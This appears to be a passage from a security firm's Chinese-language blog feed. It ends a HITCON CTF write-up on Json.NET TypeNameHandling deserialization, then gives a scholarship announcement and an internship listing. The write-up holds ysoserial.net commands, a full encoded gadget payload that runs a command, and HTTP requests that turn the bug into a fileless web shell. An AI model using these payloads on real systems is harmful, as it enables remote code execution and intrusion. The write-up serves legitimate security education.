&lt;p&gt;這個題目情境的關鍵是 &lt;a href=&quot;https://www.newtonsoft.com/json/help/html/deserializemetadatapropertyhandling.htm&quot;&gt;MetadataPropertyHandling.ReadAhead&lt;/a&gt; 這個設定值，當提供給 JsonConvert.DeserializeObject 的 JsonSerializerSettings 中有包含 MetadataPropertyHandling.ReadAhead 時，它會假設 $type 不是在第一個屬性值的位置，這會導致 Json.NET 先嘗試從頭到尾把 JSON 解析完並找出 $type 後才開始建立物件，在此情境下也會讓我們注入的第二個 $type 直接覆蓋第一個 $type 的值，所以假如程式碼改寫為如下的程式碼時，這個 Clone function 將會變得 exploitable。&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;you control the key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;you control the value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAhead&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們可以來實際利用一個 gadget 進行 code execution 測試，這邊我使用 ysoserial.net 產生 RolePrincipal gadget 的 payload ( &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ysoserial.exe -g RolePrincipal -f Json.Net -c calc&lt;/code&gt; )，因為這個 gadget 只需要控制 JSON 一層的字串就可以執行指令，題目情境相對容易建構。&lt;/p&gt;

&lt;p&gt;測試執行：&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;System.Security.ClaimsPrincipal.Identities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAhead&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;嘗試執行以上程式碼後，成功彈出計算機！
&lt;img src=&quot;/assets/img/blog/20230918/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;既然驗證此設定是可以 exploit 的，剩下就是包裝一個應用程式的情境，而最終趕出的成品就是 My todolist 這道題目。&lt;/p&gt;

&lt;p&gt;理論上直接使用 RolePrincipal 就能執行系統指令了，只是這個 exploit 執行後不會有任何指令回顯，而我們還需要嘗試找到並讀取 flag，為了後續更便利操作，我們可以嘗試將漏洞轉換成 web shell，詳細可以參考我的另一篇文章「&lt;a href=&quot;https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/&quot;&gt;玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門！&lt;/a&gt;」，但這個方法的 gadget 是需要使用 BinaryFormatter 執行 OnDeserialization callback 進而觸發 gadget chain 的執行，但如果你有 clone 最新版本的 ysoserial.net 來自行編譯的話，會發現 help 訊息中多了一個新的參數 –bgc。&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--bgc, --bridgedgadgetchains=VALUE
    Chain of bridged gadgets separated by comma (,). 
      Each gadget will be used to complete the next 
      bridge gadget. The last one will be used in the 
      requested gadget. This will be ignored when 
      using the searchformatter argument.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;沒錯，為這個專案貢獻的研究者們成功找到 gadget chain 實現將 Json.NET 等需要 setter 類型的 gadget 的 formatter 轉換成 BinaryFormatter 的二次反序列化，從而可以執行更多的 gadget，其中當然就包括  ActivitySurrogateDisableTypeCheck 和 ActivitySurrogateSelectorFromFile 這兩個最重要的 gadget，我們也因此可以再次使用這個功能實現反序列化攻擊到 fileless webshell 的 exploit！
產生 payload 的指令：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-!&quot;&gt;ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateDisableTypeCheck -c 1

ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateSelectorFromFile -c &quot;.\ExploitClass.cs;dlls\System.dll;dlls\System.Web.dll&quot;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最後題目只要在正常註冊後隨便新增一個 note 進行修改，再分別對兩個 payload 執行一次類似下面的請求，就可以達成有回顯的 RCE 了！&lt;/p&gt;

&lt;p&gt;Request 1:&lt;/p&gt;
&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/Api/UpdateTodo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:8003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;lt;session&amp;gt;&lt;/span&gt;

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&amp;amp;field=$type&amp;amp;value=System.Web.Security.RolePrincipal,+System.Web,+Version%3d4.0.0.0,+Culture%3dneutral,+PublicKeyToken%3db03f5f7f11d50a3a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Request 2:&lt;/p&gt;
&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/Api/UpdateTodo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:8003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;lt;session&amp;gt;&lt;/span&gt;

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&amp;amp;field=System.Security.ClaimsPrincipal.Identities&amp;amp;value=&amp;lt;payload&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Request 3:&lt;/p&gt;
&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/Api/MyProfile&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:8003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;10&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;lt;session&amp;gt;&lt;/span&gt;

cmd=whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
                <link>https://devco.re/blog/2023/09/18/hitcon-2023-devcore-wargame-my-todolist-writeup/</link>
                <guid>https://devco.re/blog/2023/09/18/hitcon-2023-devcore-wargame-my-todolist-writeup</guid>
                <pubDate>Mon, 18 Sep 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>視人才培育為己任　DEVCORE 全國資訊安全獎學金、資安教育活動贊助計畫即日起開放報名</title>
                <description>&lt;p&gt;DEVCORE 今（30）日甫於輔仁大學舉辦「戴夫寇爾資訊安全獎學金」2023 年度頒獎典禮，共有 3 位資工系同學獲獎。同一時間，我們很高興地宣佈，今年度我們也將續辦「全國資訊安全獎學金」及「資安教育活動贊助計畫」，即日起開放報名！&lt;/p&gt;

&lt;p&gt;近年來，無論是政府或企業，在數位浪潮及雲世代的推波助瀾下，無不開始正視資安人才荒的困境。自 2012 年創立之初，DEVCORE 即秉持著提升台灣資安競爭力、讓世界更安全的初衷，將人才培育視為己任，透過參與教育部資安人才培育計畫、創辦 DEVCORE 實習生計畫、啟動戴夫寇爾資安獎學金、辦理資安教育活動贊助計畫等方式，協助資安人才茁壯成長。&lt;/p&gt;

&lt;h3 id=&quot;devcore-全國資訊安全獎學金&quot;&gt;DEVCORE 全國資訊安全獎學金&lt;/h3&gt;

&lt;p&gt;戴夫寇爾資安獎學金於 2020 年首次頒發，原為感念過去在學生時代時受到的各方資源及鼓勵，獎學金頒發範圍為經營團隊母校的輔仁大學及國立臺灣科技大學，後為培育更多有志於此的青年學子，我們於去年擴大獎學金範圍，開放全國各地的資安新銳報名申請，期待能推廣「駭客思維」、強化資安技能，並幫助在學學生了解資安產業生態及現況、降低學用落差，未來成為新一代的攻擊型資安人才，為資安產業注入新活力。&lt;/p&gt;

&lt;p&gt;「戴夫寇爾全國資訊安全獎學金」歡迎所有在資訊安全領域有出眾研究成果的學生報名申請，有意申請者須提出學習資安的動機與歷程，並繳交資安研究或比賽成果，我們將從中擇優選取 10 名，獲選者可獲最高 2 萬元的研究補助。詳細申請辦法如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;申請資格：全國各大專院校學生皆可以申請。&lt;/li&gt;
  &lt;li&gt;獎學金金額/名額：每年度取 10 名，每名可獲得獎學金新台幣 20,000 元整，共計 20 萬元。如報名踴躍我們將視申請狀況增加名額。&lt;/li&gt;
  &lt;li&gt;申請時程：
    &lt;ul&gt;
      &lt;li&gt;2023/8/30 官網公告獎學金計畫資訊&lt;/li&gt;
      &lt;li&gt;2023/8/31 - 2023/9/30 開放收件&lt;/li&gt;
      &lt;li&gt;2023/10/31 公布審查結果，並將於 11 至 12 月間頒發獎學金&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;申請辦法：
    &lt;ul&gt;
      &lt;li&gt;請依⽂件檢核表項次順序排列已附⽂件，彙整為⼀份 PDF 檔案，寄⾄ scholarship@devco.re。&lt;/li&gt;
      &lt;li&gt;信件主旨及 PDF 檔案名稱請符合以下格式：[全國獎學⾦申請] 學校名稱_學號_姓名（範例：[全國獎學⾦申請] 輔仁⼤學_B11100000_王⼩美）。&lt;/li&gt;
      &lt;li&gt;請申請⼈⾃我檢核並於申請⼈檢核區勾選已附⽂件，若⽂件不⿑或未確實勾選恕不受理申請。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;須檢附文件：
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;/assets/files/scholarship/戴夫寇爾全國獎學金申請表.pdf&quot;&gt;本獎學⾦申請表&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;在學證明&lt;/li&gt;
      &lt;li&gt;最近⼀學期成績單&lt;/li&gt;
      &lt;li&gt;學習資訊安全之動機與歷程⼼得⼀篇：字數 500 - 2000 字&lt;/li&gt;
      &lt;li&gt;資訊安全技術相關研究成果：至少須從以下六項目中擇一繳交，包含研討會投稿結果、漏洞獎勵計畫成果、弱點研究成果、資訊安全比賽成果、資安工具研究成果、技術文章發表成果等&lt;/li&gt;
      &lt;li&gt;社群經營成果：至少須從以下兩項目中擇一繳交，包含校園資安社團、公開資安社群等&lt;/li&gt;
      &lt;li&gt;推薦函：導師、系主任、其他教授或業界⼈⼠推薦函，⾄少須取得兩封以上推薦函&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;devcore-資安教育活動贊助計劃&quot;&gt;DEVCORE 資安教育活動贊助計劃&lt;/h3&gt;
&lt;p&gt;取之於社會，用之於社會。DEVCORE 創立至今已準備邁入第 11 年，我們期待能以不同的方式加深校園與產業的連結，推廣正確的資安意識及駭客思維，協助台灣資安人才成長茁壯。&lt;/p&gt;

&lt;p&gt;今年我們也將持續贊助資安教育活動，提供經費予資安相關之社群、社團辦理各項活動，凝聚台灣資安社群，加速培育台灣的資安新銳。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;申請資格：與資安議題相關之社群、社團活動，請由 1 位社團代表人填寫資料。&lt;/li&gt;
  &lt;li&gt;贊助金額：依各社團活動需求及與戴夫寇爾討論而定，每次最高補助金額為新台幣 20,000 元整。&lt;/li&gt;
  &lt;li&gt;申請時程：如欲申請此計畫的社團或活動，請於 2023/10/31 前透過以下連結填寫初步資料，我們會在 30 日內通知符合申請資格者提供進一步資料，不符合資格者將不另行通知。&lt;/li&gt;
  &lt;li&gt;申請連結：&lt;a href=&quot;https://forms.gle/dW3GcGjw5z8WQ9pV9&quot; target=&quot;_blank&quot;&gt;DEVCORE 2023 年資安教育活動贊助調查&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;須提供資料：
    &lt;ul&gt;
      &lt;li&gt;申請資格：申請人需以各資安社群或社團名義提出申請。&lt;/li&gt;
      &lt;li&gt;聯絡電子郵件&lt;/li&gt;
      &lt;li&gt;想要辦理的活動類型&lt;/li&gt;
      &lt;li&gt;想要辦理的活動方式&lt;/li&gt;
      &lt;li&gt;活動總預算&lt;/li&gt;
      &lt;li&gt;預計需要贊助金額&lt;/li&gt;
      &lt;li&gt;代表人姓名、連絡電話&lt;/li&gt;
      &lt;li&gt;團體名稱&lt;/li&gt;
      &lt;li&gt;團體單位網址&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;注意事項：
    &lt;ul&gt;
      &lt;li&gt;申請案審核將經過戴夫寇爾內部審核機制，並保有最終核決權。&lt;/li&gt;
      &lt;li&gt;本問卷僅供初步意願蒐集用途，符合申請資格者，戴夫寇爾將於 30 日內通知提供進一步資料供審核，其餘將不另行通知。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2023/08/30/2023-devcore-cybersecurity-scholarship-application-opens/</link>
                <guid>https://devco.re/blog/2023/08/30/2023-devcore-cybersecurity-scholarship-application-opens</guid>
                <pubDate>Wed, 30 Aug 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2023 第四屆實習生計畫</title>
                <description>&lt;p&gt;DEVCORE 創立迄今已逾十年，持續專注於提供主動式資安服務，並致力尋找各種安全風險及漏洞，讓世界變得更安全。為了持續尋找更多擁有相同理念的資安新銳、協助學生建構正確資安意識及技能，我們成立了「戴夫寇爾全國資訊安全獎學金」，2022 年初也開始舉辦首屆實習生計畫，目前為止成果頗豐、超乎預期，第三屆實習生計畫也將於今年 7 月底告一段落。我們很榮幸地宣佈，第四屆實習生計畫即將登場，若您期待加入我們、精進資安技能，煩請詳閱下列資訊後來信報名！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;實習內容&quot;&gt;實習內容&lt;/h3&gt;

&lt;p&gt;本次實習分為 Binary 及 Web 兩個組別，主要內容如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
以研究為主，在與導師確定研究標的後，分析目標架構、進行逆向工程或程式碼審查。藉由這個過程訓練自己的思路，找出可能的攻擊面與潛在的弱點。另外也會讓大家嘗試分析及寫過往漏洞的 Exploit，理解過去漏洞都出現在哪，體驗真實世界的漏洞都是如何利用。
    &lt;ul&gt;
      &lt;li&gt;漏洞挖掘及研究 70 %&lt;/li&gt;
      &lt;li&gt;1-day 開發 (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
導師會與學生討論並確定一個以學生的期望為主的實習目標，並在過程輔導成長以完成目標，內容可以是深入研究近年常見新型態漏洞、攻擊手法、開源軟體，或是程式語言生態系的常見弱點，亦或是展現你的技術力以開發與紅隊相關的工具。
    &lt;ul&gt;
      &lt;li&gt;漏洞、攻擊手法或開發工具研究 90%&lt;/li&gt;
      &lt;li&gt;成果報告與準備 10%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司地點&quot;&gt;公司地點&lt;/h3&gt;

&lt;p&gt;台北市松山區八德路三段 32 號 13 樓&lt;/p&gt;

&lt;h3 id=&quot;實習時間&quot;&gt;實習時間&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2023 年 9 月開始到 2024 年 1 月底，共 5 個月。&lt;/li&gt;
  &lt;li&gt;每週工作兩天，工作時間為 10:00 – 18:00
    &lt;ul&gt;
      &lt;li&gt;每週固定一天下午 14:00 - 18:00 必須到公司討論進度
        &lt;ul&gt;
          &lt;li&gt;如果居住雙北外可彈性調整(但須每個組別統一)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;其餘時間皆為遠端作業&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;招募對象&quot;&gt;招募對象&lt;/h3&gt;

&lt;p&gt;具有一定程度資安背景的學生，且可每週工作兩天。&lt;/p&gt;

&lt;h3 id=&quot;預計招收名額&quot;&gt;預計招收名額&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary 組：2~3 人&lt;/li&gt;
  &lt;li&gt;Web 組：2~3 人&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;

